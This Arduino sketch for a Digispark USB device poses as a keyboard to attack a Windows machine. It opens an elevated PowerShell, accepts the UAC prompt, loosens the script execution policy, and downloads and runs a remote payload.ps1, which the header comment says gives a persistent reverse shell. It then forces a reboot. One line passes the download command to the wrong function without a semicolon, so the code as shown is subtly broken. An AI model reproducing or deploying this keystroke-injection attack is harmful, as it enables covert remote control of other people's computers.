// This script downloads and executes a powershell script to provide a persistent reverse shell to our host.
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  /* Downloads and executes reverse shell payload */
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2500);
  
  /* Enable Running Scripts in Powershell*/
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell start-process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("Set-ExecutionPolicy RemoteSigned;");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("A");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke("IEX (New-Object Net.WebClient).DownloadString('[FILESERVER]/payload.ps1');")
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.print("shutdown /r /t 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
